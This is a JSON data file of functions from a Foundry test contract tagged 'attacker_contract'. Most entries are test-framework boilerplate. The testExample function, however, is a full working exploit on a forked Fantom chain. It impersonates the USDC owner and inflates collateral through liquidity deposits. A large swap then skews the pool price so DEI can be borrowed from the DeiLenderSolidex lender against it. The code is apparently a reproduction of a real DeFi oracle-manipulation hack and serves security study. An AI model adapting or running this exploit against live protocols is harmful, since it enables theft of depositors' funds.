[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheat.createSelectFork(\"fantom\", 37_093_708); // fork fantom at block 37093708\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExample",
    "original_code": "    function testExample() public {\n        cheat.prank(owner_of_usdc);\n\n        usdc.Swapin(\n            0x33e48143c6ea17476eeabfa202d8034190ea3f2280b643e2570c54265fe33c98, address(this), 150_000_000 * 10 ** 6\n        );\n\n        uint256 balance_of_usdc = usdc.balanceOf(address(this));\n\n        emit log_named_uint(\"The USDC I have now\", balance_of_usdc);\n\n        usdc.approve(address(sspv4), type(uint256).max);\n\n        sspv4.buyDei(1_000_000 * 10 ** 6);\n\n        uint256 balance_of_dei = dei.balanceOf(address(this));\n\n        emit log_named_uint(\"The DEI after buying DEI\", balance_of_dei);\n\n        balance_of_usdc = usdc.balanceOf(address(this));\n\n        emit log_named_uint(\"The USDC after buying DEI\", balance_of_usdc);\n\n        usdc.approve(address(router), type(uint256).max);\n\n        dei.approve(address(router), type(uint256).max);\n\n        router.addLiquidity(\n            address(dei),\n            address(usdc),\n            true,\n            894_048_109_294_000_000_000_000,\n            965_495_000_000,\n            876_167_147_108_120_000_000_000,\n            946_185_100_000,\n            address(this),\n            block.timestamp\n        );\n\n        uint256 balance_of_LpToken = lpToken.balanceOf(address(this));\n\n        emit log_named_uint(\"The LPToken After adding Liquidity\", balance_of_LpToken);\n\n        lpToken.approve(address(LpDepositor), type(uint256).max);\n\n        LpDepositor.deposit(address(lpToken), balance_of_LpToken);\n\n        balance_of_LpToken = lpToken.balanceOf(address(this));\n\n        uint256 balance_of_DepositToken = DepositToken.balanceOf(address(this));\n\n        emit log_named_uint(\"The DepositToken After depositting LPtoken\", balance_of_DepositToken);\n\n        DepositToken.approve(address(DeiLenderSolidex), type(uint256).max);\n\n        DeiLenderSolidex.addCollateral(address(this), balance_of_DepositToken);\n\n        balance_of_DepositToken = DepositToken.balanceOf(address(this));\n\n        emit log_named_uint(\"The DepositToken After addCollateral\", balance_of_DepositToken);\n\n        balance_of_usdc = usdc.balanceOf(address(this));\n\n        emit log_named_uint(\"The USDC I have now\", balance_of_usdc);\n\n        usdc.approve(address(router), type(uint256).max);\n\n        router.swapExactTokensForTokensSimple(\n            143_200_000_000_000, 0, address(usdc), address(dei), true, address(this), block.timestamp\n        );\n\n        balance_of_dei = dei.balanceOf(address(this));\n\n        emit log_named_uint(\"The DEI I have after swapping\", balance_of_dei);\n\n        SchnorrSign memory sig = SchnorrSign(\n            1_835_036_472_718_200_664_753_898_924_933_875_196_349_373_787_186_253_604_571_797_551_094_739_683_650,\n            0xF096EC73cB49B024f1D93eFe893E38337E7a099a,\n            0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF\n        );\n\n        SchnorrSign[] memory sigs = new SchnorrSign[](1);\n\n        sigs[0] = sig;\n\n        bytes memory repID = \"0x01701220183a8e97b39ebe3c38b6166cd7c9ddfe3c38fd76352e5652b9c25467aa47b040\";\n\n        uint256 price = oracle.getOnChainPrice();\n\n        emit log_named_uint(\"The price from Oracle\", price);\n\n        cheat.warp(1_651_113_560);\n\n        emit log_named_uint(\"the time now\", block.timestamp);\n\n        DeiLenderSolidex.borrow(\n            address(this),\n            17_246_885_701_212_305_622_476_302,\n            20_923_953_265_992_870_251_804_289,\n            1_651_113_560,\n            repID,\n            sigs\n        );\n\n        balance_of_dei = dei.balanceOf(address(this));\n\n        emit log_named_uint(\"The DEI after borrowing\", balance_of_dei);\n\n        router.swapExactTokensForTokensSimple(\n            12_000_000_000_000_000_000_000_000, 0, address(dei), address(usdc), true, address(this), block.timestamp\n        );\n\n        usdc.transfer(owner_of_usdc, 150_000_000 * 10 ** 6);\n\n        balance_of_dei = dei.balanceOf(address(this));\n\n        balance_of_usdc = usdc.balanceOf(address(this));\n\n        emit log_named_uint(\"The USDC after paying back\", balance_of_usdc);\n\n        emit log_named_uint(\"The DEI after paying back\", balance_of_dei);\n    }\n",
    "description": ""
  }
]